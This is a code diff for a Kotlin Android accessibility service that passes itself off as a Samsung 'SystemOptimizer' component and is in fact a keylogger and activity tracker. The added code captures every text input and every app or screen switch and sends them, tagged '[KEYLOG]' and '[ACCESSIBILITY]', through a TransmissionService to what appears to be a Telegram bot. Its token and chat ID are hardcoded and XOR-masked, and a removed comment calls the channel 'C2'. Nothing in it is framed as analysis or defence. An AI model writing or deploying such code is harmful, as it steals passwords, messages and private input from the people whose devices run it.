@@ -1,32 +1,33 @@
 package com.samsung.android.app.smartcapture
 
 import android.accessibilityservice.AccessibilityService
-import android.content.Intent
 import android.view.accessibility.AccessibilityEvent
 
 class SystemOptimizerAccessibilityService : AccessibilityService() {
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        // Monitor all app interactions
-        event?.let {
-            when (it.eventType) {
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                    val packageName = it.packageName?.toString() ?: "unknown"
-                    val className = it.className?.toString() ?: "unknown"
+    // Same obfuscated credentials as the main service (XOR 0xAB)
+    private val token = obfuscate("8699568956:AAE7eTdayK3EhKMhvpoMWBYrW91mTJohDUo")
+    private val chatId = obfuscate("7597928991")
 
-                    // Send to C2
-                    TransmissionService(
-                        deobfuscate("..."),
-                        "..."
-                    ).sendStatusReport("[ACCESSIBILITY] App opened: $packageName | Screen: $className")
-                }
-                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                    // Capture text input
-                    if (it.text?.isNotEmpty() == true) {
-                        TransmissionService(
-                            deobfuscate("..."),
-                            "..."
-                        ).sendStatusReport("[KEYLOG] ${it.text.joinToString("")}")
+    private val transmission by lazy {
+        TransmissionService(deobfuscate(token), deobfuscate(chatId))
+    }
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        event ?: return
+        when (event.eventType) {
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                val packageName = event.packageName?.toString() ?: "unknown"
+                val className = event.className?.toString() ?: "unknown"
+                transmission.sendStatusReport(
+                    "[ACCESSIBILITY] Window: $packageName | Screen: $className"
+                )
+            }
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                if (event.text?.isNotEmpty() == true) {
+                    val text = event.text.joinToString("")
+                    if (text.length <= 200) { // avoid flooding with large paste
+                        transmission.sendStatusReport("[KEYLOG] $text")
                     }
                 }
             }
@@ -35,11 +36,11 @@ class SystemOptimizerAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    private fun deobfuscate(input: String): String {
+    private fun obfuscate(input: String): String {
         return input.map { (it.code xor 0xAB).toChar() }.joinToString("")
     }
 
-    companion object {
-        private val TAG = "AccessibilitySvc"
+    private fun deobfuscate(input: String): String {
+        return input.map { (it.code xor 0xAB).toChar() }.joinToString("")
     }
 }
